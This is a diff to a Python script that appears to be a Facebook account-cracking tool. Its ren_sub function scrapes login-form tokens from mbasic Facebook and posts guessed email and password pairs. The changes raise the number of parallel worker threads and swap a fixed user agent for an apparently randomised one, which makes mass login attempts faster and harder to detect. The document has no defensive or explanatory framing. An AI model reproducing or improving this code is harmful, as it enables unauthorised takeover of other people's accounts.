@@ -752,7 +752,7 @@ def filee():
     print(sort.line())
     meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m-> \x1b[1;97m   "))
     print(sort.line())
-    with ThreadPool(max_workers=45) as sub:
+    with ThreadPool(max_workers=60) as sub:
         sort.clear()
         print(sort.logo())
         print(
@@ -860,7 +860,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=40) as heron:
+    with ThreadPool(max_workers=50) as heron:
         
         sort.clear()
         sort.logo()
@@ -898,7 +898,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = uagent
+            uax = uaxxxx()
             
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
